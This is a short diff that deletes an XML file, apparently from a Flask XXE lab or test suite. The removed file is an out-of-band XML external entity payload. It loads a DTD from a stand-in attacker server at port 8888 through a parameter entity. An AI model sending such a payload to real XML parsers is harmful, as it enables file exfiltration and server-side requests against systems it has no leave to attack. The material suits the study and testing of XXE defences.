@@ -1,6 +1,0 @@
-<?xml version="1.0" ?>
-<!DOCTYPE message [
-    <!ENTITY % ext SYSTEM "http://attackerserver-flaskxxe:8888/4_ext.dtd">
-    %ext;
-]>
-<message>1</message>
